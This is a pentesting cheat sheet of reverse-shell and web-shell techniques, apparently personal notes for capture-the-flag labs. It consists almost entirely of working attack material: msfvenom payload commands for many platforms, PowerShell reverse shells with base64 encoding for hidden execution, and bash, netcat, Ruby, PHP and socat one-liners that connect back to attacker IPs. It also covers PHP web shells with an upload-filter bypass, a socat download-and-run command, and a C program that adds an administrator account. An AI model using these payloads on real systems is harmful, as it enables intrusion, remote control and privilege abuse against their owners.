## Shells
### <ins>Go To</ins>

* [Reverse Shell Generator](https://www.revshells.com/)
* [PenTestMonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet/)

### <ins>Quick Note</ins>

```
Shell cleanup
------

Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.

Type sh
Then do this:

ctrl+z
# for zsh
echo $TERM
stty -a 
stty raw -echo; fg; reset
stty columns 200 rows 200
export PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/games:/tmp
export TERM=xterm-256color
python3 -c 'import pty; pty.spawn("/bin/sh")'

Also do this:

alias ll='clear ; ls -lsaht --color=auto'

echo $TERM && tput lines && tput cols


# for bash
stty raw -echo
fg
reset
export SHELL=bash



Other Notes:

If you have the ability to upload to a site a php reverse shell, but it doesn't like .php extension, another options is to do this first:

echo "AddType application/x-httpd-php .dork" > .htaccess

```
### <ins>WEB SHELLS</ins>

**/usr/share/webshells**

**MSFvenom Format:-**

`msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`

One can also use the `-a` to specify the architecture or the `--platform`
### <ins>WINDOWS</ins>

#### **Reverse Shell**

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe


#Bad chars ID'd
msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.49.130 -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" LPORT=4444 -e x86/alpha_mixed -f c
```

#### Bind Shell

```
msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > bind.exe
```

#### Create User

```
msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f exe > adduser.exe
```
#### CMD Shell

```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > prompt.exe
```
#### **Execute Command**

```
msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f exe > pay.exe

msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administrators shaun /add" -f exe > pay.exe
```
#### Encoder

```
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
```
#### Embedded inside executable

```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
```

#### Powershell

```
$client = New-Object System.Net.Sockets.TCPClient('192.168.45.225',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

Apparently this is a more evasive way of doing it:

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.100',4443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();"




PowerShell one-line example w/ encoding:

$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.225",8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | OutString );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Leng th);$stream.Flush()};$client.Close()'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText

or 

$MyCommand = '$callback = New-Object System.Net.Sockets.TCPClient("192.168.45.225",8080);$stream = $callback.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$callback.Close()'

$MyBase64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$MyCommand"))

$MyBase64


```

#### Python to encode Powershell Reverse Shell

```
Quick Python Powershell Reverse Shell generator
---

import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.164",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)

```

### <ins>LINUX</ins>

#### **Reverse Shell**

```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf

msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
#### Bind Shell

```
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > bind.elf
```
#### SunOS (Solaris)

```
msfvenom --platform=solaris --payload=solaris/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf -e x86/shikata_ga_nai -b '\x00' > solshell.elf
```

#### Another Python Method

```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'


msfconsole -q -x "use multi/handler; set payload cmd/unix/reverse_python; set lhost 192.168.45.222; set lport 4444; exploit"
```

### <ins>Web-Based Payloads</ins>

### PHP Checker
https://github.com/teambi0s/dfunc-bypasser
```
<?php phpinfo(); ?>

python dfunc-bypasser.py --file /home/kali/Downloads/miinfo.html
```

#### **PHP**

https://github.com/ivan-sincek/php-reverse-shell

Here: /opt/php-reverse-shell

##### Reverse shel**l**

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php

cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

```

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
<?php

system('nc.exe -e cmd.exe 10.10.10.5 4444')

?>

or


<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.45.204/4444 0>&1'");


```

```
<?php system($_REQUEST["cmd"]); ?>
```

```php

You could also encode this:

    echo "sh -i >& /dev/tcp/192.168.1.75/8081 0>&1" | base64 -w 0


Then do this with GIF Magic Bytes

     GIF89a;
    <?php
      system("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzgwODEgMD4mMQo= | base64 -d | bash");
    ?>
```
#### ASP/x

##### Reverse shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f asp >reverse.asp

msfvenom -p windows/meterpreter/reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f aspx >reverse.aspx
```
#### JSP

##### Reverse shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f raw> reverse.jsp
```
#### WAR

##### Reverse Shell

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f war > reverse.war
```
#### NodeJS

```
msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
```
### **Script Language payloads**

#### **Perl**

```
msfvenom -p cmd/unix/reverse_perl LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.pl
```
#### **Python**
```
msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw > reverse.py
```
#### PHP
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```
<?php

system('nc.exe -e cmd.exe 10.10.14.13 4444')

?>

<?php system($_REQUEST["cmd"]); ?>
```

### PHP Proc_Open
https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7
https://0xdf.gitlab.io/2023/01/21/htb-updown.html

This was from UpDown HTB
```
<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("file", "/tmp/error-output.txt", "a") // stderr is a file to write to
);
$process = proc_open("bash", $descriptorspec, $pipes);
if (is_resource($process)) {
    // $pipes now looks like this:
    // 0 => writeable handle connected to child stdin
    // 1 => readable handle connected to child stdout
    // Any error output will be appended to /tmp/error-output.txt
fwrite($pipes[0], "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.76 2222 >/tmp/f");
    fclose($pipes[0]);
    while (!feof($pipes[1])) {
        echo fgets($pipes[1], 1024);
    }
    fclose($pipes[1]);
    // It is important that you close any pipes before calling
    // proc_close in order to avoid a deadlock
    $return_value = proc_close($process);
    echo "command returned $return_value\n";
}
?>
google.com
google.com
google.com
google.com
google.com
google.com
```


#### BASH

```
bash -i >& /dev/tcp/MyIP/9999 0>&1

or maybe wrap it:

bach -c 'bash -i >& /dev/tcp/MyIP/9999 0>&1'

Base One-liner for URL RCE + Encoded
---

curl -k http://192.168.220.52/cmsms/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.225%2F4444%200%3E%261%22


Base64 encode
---

echo YmFzaCAtaT4mIC9kZXYvdGNwLzE5Mi4xNjEuMTEuMi81NDMyMSAwPiYxCg==|base64 -d"|bash

```
#### RUBY

```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
#### NETCAT

```
nc -e /bin/sh 10.0.0.5 1234

nc -nv 192.168.45.227 3000 -e /bin/bash

```

```
#OpenBSD netcat doesn't support -e flag. You can even try BASH 1-liner

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
#### Adduser.c

On the Attacking machine compile it first: `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe, then transfer it to Victim`

```
# ADDUSER.C

#include <stdlib.h>

int main ()

{

int i;

i = system ("net user test password123! /add");

i = system ("net localgroup administrators test /add");

return 0;

}
```

#### Socat

```
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444
#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

or Socat Command Injection one liner:
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```

### <ins>TTY Shells</ins>

Spawn shells

- Python: `python -c 'import pty; pty.spawn("/bin/sh")'`
- Python3: `python3 -c 'import pty; pty.spawn("/bin/sh")'`
- Bash: `echo os.system('/bin/bash')`
- Bash: `/bin/sh -i`
- Bash: `script -qc /bin/bash /dev/null`
- Perl: `perl -e 'exec "/bin/sh";'`
- Perl: `exec "/bin/sh";`
- Ruby: `exec "/bin/sh"`
- Lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- Nmap: `!sh`

No TTY

If you cannot obtain a full TTY, you can still interact with programs that expect user input. In the following example, the password is passed to `sudo` read a file:

```
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```